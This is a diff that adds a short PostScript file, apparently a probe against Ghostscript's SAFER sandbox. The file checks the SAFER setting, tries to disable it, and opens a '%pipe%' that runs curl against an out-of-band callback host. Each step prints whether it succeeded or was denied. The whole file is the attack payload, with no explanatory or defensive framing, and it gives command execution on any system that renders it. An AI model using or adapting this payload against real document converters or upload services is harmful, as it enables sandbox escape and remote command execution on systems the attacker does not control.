@@ -1,0 +1,9 @@
+%!PS-Adobe-3.0
+/Times-Roman findfont 9 scalefont setfont
+20 260 moveto
+{ currentuserparams /SAFER get 20 string cvs ( SAFER_STATE) show } stopped { (NO_SAFERKEY) show } if
+20 240 moveto
+{ << /SAFER false >> setuserparams (SAFER_OFF_OK) show } stopped { (SAFER_OFF_DENIED) show } if
+20 220 moveto
+{ (\045pipe\045curl -s -m 8 http://dbcru7v0do6eus0eitpgqm3r3whtdz5ew.oast.pro/safer_off) (r) file 200 string readstring pop show ( OFF_PIPE_OPEN) show } stopped { (OFF_PIPE_DENIED) show } if
+showpage
